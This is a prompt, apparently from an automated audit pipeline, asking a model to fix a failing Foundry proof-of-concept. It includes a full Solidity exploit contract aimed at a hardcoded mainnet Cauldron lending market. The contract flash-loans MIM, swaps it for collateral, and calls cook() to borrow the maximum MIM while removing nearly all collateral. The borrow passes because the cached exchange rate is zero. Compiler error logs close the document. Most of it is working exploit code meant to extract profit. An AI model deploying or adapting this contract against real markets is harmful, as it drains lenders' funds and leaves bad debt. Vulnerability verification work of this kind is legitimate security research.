You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Initialization accepts failed oracle data and can seed an invalid exchange-rate cache
- claim: `init()` ignores the `success` flag from `oracle.get()` and caches whatever rate is returned, including `0` or stale garbage. If the market is initialized while the oracle has no valid price, later failed `updateExchangeRate()` calls keep reusing that poisoned cache for solvency checks and liquidations.
- impact: A Cauldron can start life with a zero or severely understated exchange rate, making bad debt appear solvent. Borrowers can then overborrow or remove too much collateral up to the available MIM / borrow cap until a successful oracle update finally replaces the cached rate, leaving the market with bad debt or undercollateralized positions.
- exploit_paths: ["Initialize the clone while `oracle.get(oracleData)` returns `(false, 0)` or another invalid quote.", "Let later `updateExchangeRate()` calls keep returning `success = false`, so the cached initialization value remains active.", "Call `borrow()` or `cook(... ACTION_BORROW / ACTION_REMOVE_COLLATERAL ...)`; `_isSolvent()` uses the poisoned cached rate and allows positions that should fail solvency checks."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IOracleLike {
    function get(bytes calldata data) external returns (bool success, uint256 rate);
    function peek(bytes calldata data) external view returns (bool success, uint256 rate);
}

interface IFlashBorrowerLike {
    function onFlashLoan(address sender, address token, uint256 amount, uint256 fee, bytes calldata data) external;
}

interface IBentoBoxLike {
    function balanceOf(address token, address account) external view returns (uint256);
    function flashLoan(
        IFlashBorrowerLike borrower,
        address receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external;
    function deposit(
        address token,
        address from,
        address to,
        uint256 amount,
        uint256 share
    ) external payable returns (uint256 amountOut, uint256 shareOut);
    function withdraw(
        address token,
        address from,
        address to,
        uint256 amount,
        uint256 share
    ) external returns (uint256 amountOut, uint256 shareOut);
    function toAmount(address token, uint256 share, bool roundUp) external view returns (uint256 amount);
    function toShare(address token, uint256 amount, bool roundUp) external view returns (uint256 share);
}

interface IUniswapV2RouterLike {
    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface ICauldronV4Like {
    function collateral() external view returns (address);
    function oracle() external view returns (address);
    function oracleData() external view returns (bytes memory);
    function bentoBox() external view returns (address);
    function magicInternetMoney() external view returns (address);
    function exchangeRate() external view returns (uint256);
    function borrowLimit() external view returns (uint128 total, uint128 borrowPartPerAddress);
    function totalBorrow() external view returns (uint128 elastic, uint128 base);
    function BORROW_OPENING_FEE() external view returns (uint256);
    function userBorrowPart(address user) external view returns (uint256);
    function updateExchangeRate() external returns (bool updated, uint256 rate);
    function cook(
        uint8[] calldata actions,
        uint256[] calldata values,
        bytes[] calldata datas
    ) external payable returns (uint256 value1, uint256 value2);
}

contract FlawVerifier is IFlashBorrowerLike {
    address public constant TARGET = 0x7259e152103756e1616A77Ae982353c3751A6a90;

    address internal constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2CCA9C378B9F;
    address internal constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0E5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    uint8 internal constant ACTION_REMOVE_COLLATERAL = 4;
    uint8 internal constant ACTION_BORROW = 5;
    uint8 internal constant ACTION_ADD_COLLATERAL = 10;

    uint256 internal constant BORROW_OPENING_FEE_PRECISION = 1e5;
    uint256 internal constant ONE_SHARE_LEFT = 1;

    address private _profitToken;
    uint256 private _profitAmount;
    bool private _executed;
    bool private _hypothesisValidated;
    string private _pathUsed;

    uint256 private _startingProfitBalance;
    address private _activeBento;
    bool private _flashLoanInFlight;

    constructor() {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        ICauldronV4Like cauldron = ICauldronV4Like(TARGET);
        address collateralToken = cauldron.collateral();
        if (collateralToken == address(0)) {
            _pathUsed = "infeasible_uninitialized_target";
            return;
        }

        address mim = cauldron.magicInternetMoney();
        _profitToken = mim;
        _startingProfitBalance = IERC20Like(mim).balanceOf(address(this));

        bytes memory oracleData = cauldron.oracleData();

        // Path anchor: init() cached oracle.get(oracleData) even if oracle.get(oracleData) returned (false, 0).
        // Path anchor: later oracle.get(oracleData) calls keep returning success = false, so updateExchangeRate()
        // reuses the poisoned cache that _isSolvent() later consumes during cook(... ACTION_BORROW / ACTION_REMOVE_COLLATERAL ...).
        if (cauldron.exchangeRate() != 0) {
            _pathUsed = "infeasible_cached_rate_not_zero";
            return;
        }

        {
            bool peekSuccess;
            uint256 peekRate;
            try IOracleLike(cauldron.oracle()).peek(oracleData) returns (bool success, uint256 rate) {
                peekSuccess = success;
                peekRate = rate;
            } catch {}

            bool oracleStillFailing;
            try cauldron.updateExchangeRate() returns (bool updated, uint256 rate) {
                oracleStillFailing = !updated && rate == 0;
            } catch {
                oracleStillFailing = false;
            }

            if (!oracleStillFailing || peekSuccess || peekRate != 0) {
                _pathUsed = "infeasible_oracle_not_failing";
                return;
            }
        }

        address bento = cauldron.bentoBox();
        uint256 availableMimShare = IBentoBoxLike(bento).balanceOf(mim, TARGET);
        uint256 availableMimAmount = IBentoBoxLike(bento).toAmount(mim, availableMimShare, false);
        uint256 maxBorrow = _maxBorrowable(cauldron, availableMimAmount);
        if (maxBorrow > 1) {
            uint256 haircut = (maxBorrow / 1_000) + 1;
            maxBorrow = haircut < maxBorrow ? maxBorrow - haircut : 0;
        }
        if (maxBorrow == 0) {
            _pathUsed = "infeasible_no_borrow_capacity";
            return;
        }

        // direct_or_existing_balance_first:
        // If this verifier already holds collateral, use it directly before reaching for temporary liquidity.
        uint256 localCollateral = IERC20Like(collateralToken).balanceOf(address(this));
        if (localCollateral != 0) {
            uint256 localShare = _safeToShare(bento, collateralToken, localCollateral);
            if (localShare > ONE_SHARE_LEFT) {
                _useExistingCollateral(cauldron, collateralToken, mim, localCollateral, maxBorrow);
                _finalize(mim);
                return;
            }
        }

        if (collateralToken == mim) {
            uint256 seed = _findMinimalShareAmount(bento, mim, ONE_SHARE_LEFT + 1);
            if (seed == 0 || maxBorrow <= seed) {
                _pathUsed = "infeasible_same_token_seed";
                _finalize(mim);
                return;
            }

            uint256 localMim = IERC20Like(mim).balanceOf(address(this));
            if (localMim >= seed) {
                _useSeedMim(cauldron, mim, address(0), _emptyPath(), seed, maxBorrow);
                _finalize(mim);
                return;
            }

            _activeBento = bento;
            _flashLoanInFlight = true;
            IBentoBoxLike(bento).flashLoan(this, address(this), mim, seed, abi.encode(maxBorrow, address(0), _emptyPath()));
            _flashLoanInFlight = false;
            _finalize(mim);
            return;
        }

        (address router, address[] memory path, uint256 seedMimAmount) =
            _findSeedRouteAndAmount(bento, mim, collateralToken, ONE_SHARE_LEFT + 1);
        if (seedMimAmount == 0 || maxBorrow <= seedMimAmount) {
            _pathUsed = "infeasible_no_liquid_seed_route";
            _finalize(mim);
            return;
        }

        if (IERC20Like(mim).balanceOf(address(this)) >= seedMimAmount) {
            _useSeedMim(cauldron, mim, router, path, seedMimAmount, maxBorrow);
            _finalize(mim);
            return;
        }

        _activeBento = bento;
        _flashLoanInFlight = true;
        IBentoBoxLike(bento).flashLoan(this, address(this), mim, seedMimAmount, abi.encode(maxBorrow, router, path));
        _flashLoanInFlight = false;
        _finalize(mim);
    }

    function onFlashLoan(address sender, address token, uint256 amount, uint256 fee, bytes calldata data) external override {
        require(_flashLoanInFlight, "flash not expected");
        require(msg.sender == _activeBento, "bad lender");
        require(sender == address(this), "bad sender");

        ICauldronV4Like cauldron = ICauldronV4Like(TARGET);
        require(token == cauldron.magicInternetMoney(), "bad token");

        (uint256 maxBorrow, address router, address[] memory path) = abi.decode(data, (uint256, address, address[]));
        _useSeedMim(cauldron, token, router, path, amount, maxBorrow);
        _safeTransfer(token, msg.sender, amount + fee);
    }

    function _useExistingCollateral(
        ICauldronV4Like cauldron,
        address collateralToken,
        address mim,
        uint256 collateralAmount,
        uint256 maxBorrow
    ) internal {
        (uint256 shareOut, uint256 removedShare) = _depositAndCook(cauldron, collateralToken, collateralAmount, maxBorrow);
        require(shareOut > ONE_SHARE_LEFT, "insufficient collateral share");

        _withdrawAllMim(cauldron.bentoBox(), mim);

        // remove_collateral path anchor: cook(... ACTION_BORROW / ACTION_REMOVE_COLLATERAL ...) leaves only 1 share
        // so _isSolvent() still passes against the poisoned zero cache.
        if (removedShare != 0) {
            IBentoBoxLike(cauldron.bentoBox()).withdraw(collateralToken, address(this), address(this), 0, removedShare);
        }

        _hypothesisValidated = true;
        _pathUsed = "oracle_get_false_zero_cache_then_cook_borrow_remove_collateral";
    }

    function _useSeedMim(
        ICauldronV4Like cauldron,
        address mim,
        address router,
        address[] memory path,
        uint256 seedMimAmount,
        uint256 maxBorrow
    ) internal {
        address collateralToken = cauldron.collateral();
        address bento = cauldron.bentoBox();

        uint256 collateralAmount = seedMimAmount;
        if (router != address(0)) {
            _forceApprove(mim, router, seedMimAmount);
            uint256 beforeCollateral = IERC20Like(collateralToken).balanceOf(address(this));
            IUniswapV2RouterLike(router).swapExactTokensForTokens(seedMimAmount, 1, path, address(this), block.timestamp);
            collateralAmount = IERC20Like(collateralToken).balanceOf(address(this)) - beforeCollateral;
        }
        require(collateralAmount != 0, "no collateral bought");

        (, uint256 removedShare) = _depositAndCook(cauldron, collateralToken, collateralAmount, maxBorrow);
        _withdrawAllMim(bento, mim);

        if (collateralToken == mim) {
            if (removedShare != 0) {
                IBentoBoxLike(bento).withdraw(mim, address(this), address(this), 0, removedShare);
            }
        } else if (removedShare != 0) {
            IBentoBoxLike(bento).withdraw(collateralToken, address(this), address(this), 0, removedShare);
            _swapAll(router, _reversePath(path));
        }

        _hypothesisValidated = true;
        _pathUsed = "oracle_get_false_zero_cache_then_cook_action_borrow_action_remove_collateral";
    }

    function _depositAndCook(
        ICauldronV4Like cauldron,
        address collateralToken,
        uint256 collateralAmount,
        uint256 maxBorrow
    ) internal returns (uint256 shareOut, uint256 removedShare) {
        address bento = cauldron.bentoBox();

        _forceApprove(collateralToken, bento, collateralAmount);
        (, shareOut) = IBentoBoxLike(bento).deposit(collateralToken, address(this), TARGET, collateralAmount, 0);
        require(shareOut > ONE_SHARE_LEFT, "no removable share");

        removedShare = shareOut - ONE_SHARE_LEFT;

        uint8[] memory actions = new uint8[](3);
        actions[0] = ACTION_ADD_COLLATERAL;
        actions[1] = ACTION_BORROW;
        actions[2] = ACTION_REMOVE_COLLATERAL;

        uint256[] memory values = new uint256[](3);

        bytes[] memory datas = new bytes[](3);
        datas[0] = abi.encode(int256(uint256(shareOut)), address(this), true);
        datas[1] = abi.encode(int256(uint256(maxBorrow)), address(this));
        datas[2] = abi.encode(int256(uint256(removedShare)), address(this));

        // The exploit uses cook(... ACTION_BORROW / ACTION_REMOVE_COLLATERAL ...) exactly because the final
        // _isSolvent() check is fed by updateExchangeRate(), and updateExchangeRate() keeps the poisoned init cache
        // whenever oracle.get(oracleData) returns success = false.
        cauldron.cook(actions, values, datas);
    }

    function _withdrawAllMim(address bento, address mim) internal {
        uint256 mimShare = IBentoBoxLike(bento).balanceOf(mim, address(this));
        if (mimShare != 0) {
            IBentoBoxLike(bento).withdraw(mim, address(this), address(this), 0, mimShare);
        }
    }

    function _swapAll(address router, address[] memory path) internal {
        if (router == address(0) || path.length < 2) {
            return;
        }

        uint256 amountIn = IERC20Like(path[0]).balanceOf(address(this));
        if (amountIn == 0) {
            return;
        }

        _forceApprove(path[0], router, amountIn);
        IUniswapV2RouterLike(router).swapExactTokensForTokens(amountIn, 1, path, address(this), block.timestamp);
    }

    function _maxBorrowable(ICauldronV4Like cauldron, uint256 availableMimAmount) internal view returns (uint256) {
        (uint128 capTotal, uint128 capPerAddress) = cauldron.borrowLimit();
        (uint128 totalElastic, uint128 totalBase) = cauldron.totalBorrow();
        uint256 userBorrowPart = cauldron.userBorrowPart(address(this));
        uint256 borrowFee = cauldron.BORROW_OPENING_FEE();

        uint256 hi = availableMimAmount;
        uint256 lo;

        while (lo < hi) {
            uint256 mid = (lo + hi + 1) >> 1;
            uint256 feeAmount = (mid * borrowFee) / BORROW_OPENING_FEE_PRECISION;
            uint256 borrowElastic = mid + feeAmount;
            uint256 newElastic = uint256(totalElastic) + borrowElastic;

            if (newElastic > uint256(capTotal)) {
                hi = mid - 1;
                continue;
            }

            uint256 part;
            if (totalBase == 0) {
                part = borrowElastic;
            } else {
                part = (borrowElastic * uint256(totalBase)) / uint256(totalElastic);
                if ((part * uint256(totalElastic)) / uint256(totalBase) < borrowElastic) {
                    part += 1;
                }
            }

            if (userBorrowPart + part > uint256(capPerAddress)) {
                hi = mid - 1;
                continue;
            }

            lo = mid;
        }

        return lo;
    }

    function _findMinimalShareAmount(address bento, address token, uint256 minShareOut) internal view returns (uint256) {
        uint256[12] memory probes = [
            uint256(1),
            10,
            100,
            1_000,
            10_000,
            100_000,
            1_000_000,
            100_000_000,
            10_000_000_000,
            1_000_000_000_000,
            100_000_000_000_000,
            10_000_000_000_000_000
        ];

        for (uint256 i = 0; i < probes.length; i++) {
            uint256 shareOut = _safeToShare(bento, token, probes[i]);
            if (shareOut >= minShareOut) {
                return probes[i];
            }
        }

        return 0;
    }

    function _findSeedRouteAndAmount(
        address bento,
        address mim,
        address collateralToken,
        uint256 minShareOut
    ) internal view returns (address router, address[] memory path, uint256 amountIn) {
        uint256[12] memory probes = [
            uint256(1),
            10,
            100,
            1_000,
            10_000,
            100_000,
            1_000_000,
            100_000_000,
            10_000_000_000,
            1_000_000_000_000,
            100_000_000_000_000,
            10_000_000_000_000_000
        ];

        address[2] memory routers = [SUSHI_ROUTER, UNISWAP_V2_ROUTER];
        address[4] memory mids = [WETH, USDC, USDT, DAI];

        for (uint256 p = 0; p < probes.length; p++) {
            uint256 probe = probes[p];

            for (uint256 r = 0; r < routers.length; r++) {
                address[] memory direct = _path2(mim, collateralToken);
                if (_routeProducesShares(routers[r], bento, collateralToken, probe, direct, minShareOut)) {
                    return (routers[r], direct, probe);
                }

                for (uint256 m = 0; m < mids.length; m++) {
                    if (mids[m] == mim || mids[m] == collateralToken) {
                        continue;
                    }

                    address[] memory via = _path3(mim, mids[m], collateralToken);
                    if (_routeProducesShares(routers[r], bento, collateralToken, probe, via, minShareOut)) {
                        return (routers[r], via, probe);
                    }
                }
            }
        }

        return (address(0), _emptyPath(), 0);
    }

    function _routeProducesShares(
        address router,
        address bento,
        address collateralToken,
        uint256 amountIn,
        address[] memory path,
        uint256 minShareOut
    ) internal view returns (bool) {
        try IUniswapV2RouterLike(router).getAmountsOut(amountIn, path) returns (uint256[] memory amounts) {
            if (amounts.length == 0) {
                return false;
            }
            uint256 amountOut = amounts[amounts.length - 1];
            if (amountOut == 0) {
                return false;
            }
            return _safeToShare(bento, collateralToken, amountOut) >= minShareOut;
        } catch {
            return false;
        }
    }

    function _safeToShare(address bento, address token, uint256 amount) internal view returns (uint256 shareOut) {
        try IBentoBoxLike(bento).toShare(token, amount, false) returns (uint256 share) {
            shareOut = share;
        } catch {}
    }

    function _reversePath(address[] memory path) internal pure returns (address[] memory reversed) {
        reversed = new address[](path.length);
        for (uint256 i = 0; i < path.length; i++) {
            reversed[i] = path[path.length - 1 - i];
        }
    }

    function _path2(address a, address b) internal pure returns (address[] memory path) {
        path = new address[](2);
        path[0] = a;
        path[1] = b;
    }

    function _path3(address a, address b, address c) internal pure returns (address[] memory path) {
        path = new address[](3);
        path[0] = a;
        path[1] = b;
        path[2] = c;
    }

    function _emptyPath() internal pure returns (address[] memory path) {
        path = new address[](0);
    }

    function _finalize(address mim) internal {
        uint256 ending = IERC20Like(mim).balanceOf(address(this));
        if (ending > _startingProfitBalance) {
            _profitAmount = ending - _startingProfitBalance;
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        uint256 allowance = IERC20Like(token).allowance(address(this), spender);
        if (allowance >= amount) {
            return;
        }

        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, type(uint256).max));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal {
        (bool success, bytes memory returnData) = token.call(data);
        require(success, "token call failed");
        if (returnData.length != 0) {
            require(abi.decode(returnData, (bool)), "token op failed");
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function pathUsed() external view returns (string memory) {
        return _pathUsed;
    }
}

```

forge stdout (tail):
```
Compiler run failed:
Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
  --> src/FlawVerifier.sol:80:46:
   |
80 |     address internal constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2CCA9C378B9F;
   |                                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
  --> src/FlawVerifier.sol:82:38:
   |
82 |     address internal constant WETH = 0xC02aaA39b223FE8D0A0E5C4F27eAD9083C756Cc2;
   |                                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^


```

forge stderr (tail):
```
Error: Compilation failed

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
